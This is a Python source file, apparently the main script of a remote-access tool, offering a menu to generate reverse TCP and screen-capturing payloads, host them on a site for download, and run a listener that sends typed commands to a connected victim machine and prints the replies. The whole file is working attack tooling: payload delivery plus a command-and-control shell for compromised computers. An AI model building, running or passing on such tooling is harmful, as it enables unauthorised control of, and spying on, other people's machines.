import socket
from termcolor import colored
from lib.startsite import start_site
from lib.reversetcp import generate_payload
from lib.screenshoter import generate_screenshoter
import random
import os
import platform
import time
import sys


banner = "banners/banner" + str(random.randint(1,3)) + ".txt"
colors = ["red", "green", "yellow", "cyan"]
color = random.choice(colors)
answers = ["y", "yes", "n", "no"]
platform = platform.system()
__version__ = "BETA"

if platform.lower() == 'windows':
	clear = "cls"
else:
	clear = "clear"

def print_banner():
	with open("./lib/" + banner, "r") as b: 
		print(colored(b.read(), color))

def clear_screen():
	os.system(clear)
	print_banner()

def start_server(lport):
	clear_screen()
	print("\nStarting listener...")

	sock = socket.socket()
	sock.bind(("", int(lport)))
	sock.listen(10)

	conn, addr = sock.accept()
	ip = addr[0]
	print("Accepted connection from " + ip + ":" + str(addr[1]))

	inp = ""
	while inp != "exit":
		inp = input("[" + ip + "]" + colored(" >_ ", color))
		try:
			conn.send(inp.encode())
		except:
			print(colored("Connection refused"))

		conn.settimeout(2)
		try:
			data = conn.recv(16384)
		except:
			pass
		else:
			print(data.decode('utf-8','ignore'))

	sock.close()
	action_list()

def action_list():
	clear_screen()
	ans = ""
	payload_name = ""

	while True:
		print("""
	-(P) Generate payload
	-(W) Wait for connection
	-(S) Start site
	-(N) Set payload name
	-(I) Info
	-(E) Exit
			""")

		ans = input("[" + __version__ + "]" + colored(" >> ", color)) 

		if ans.lower() == "p":
			clear_screen()
			type = ""

			while True:
				print("\nChoose payload type")
				print("===================")
				print("[1] Reverse TCP")
				print("[2] Screenshoter")
				print("===================")
				type = input("type" + colored(" > ", color))

				if type == '1':
					payload_name, lport = generate_payload(color)

					ans = ""

					while ans.lower() not in answers:
						ans = input("Would you like to start a server? [Y/n]: ")

					if ans.lower() == "y" or ans.lower() == "yes":
						start_server(lport)

					break

				elif type == '2':
					payload_name = generate_screenshoter(color)
					break

				else:
					print("Wrong input!")
					time.sleep(1)
					clear_screen()

			clear_screen()

		elif ans.lower() == "w":
			lport = input("LPORT" + colored(" > ", color))
			start_server(lport)

		elif ans.lower() == "s":
			if len(payload_name) > 0:
				clear_screen()
				start_site(payload_name, color)
				input("\nPress ENTER to exit")
			else:
				print(colored('Payload is not created or name is incorrect', "red"))
				time.sleep(1)
			clear_screen()

		elif ans.lower() == 'n':
			payload_name = input("name for payload file" + colored(" > ", color))
			print(colored("Name saved", "green"))
			time.sleep(1)
			clear_screen()

		elif ans.lower() == 'i':
			print("""
Author: PixHead
Version: """ + __version__ + """
Reverse TCP payload generator.

Usage: 	Choose P to start generating
   	Set options (LHOST and LPORT)
	Input name for file
	Wait

	Input W to start listener to accept connection from payload

Result: exe file which try to connect to the server when you run it""")
			input("\nPress ENTER to exit")
			clear_screen()
		elif ans.lower() == "e":
			print(colored("	good bye...", "green"))
			sys.exit(0)
		else:
			print("Wrong input!")
			time.sleep(1)
			clear_screen()

if __name__ == "__main__":
	action_list()

#PIU-PIU
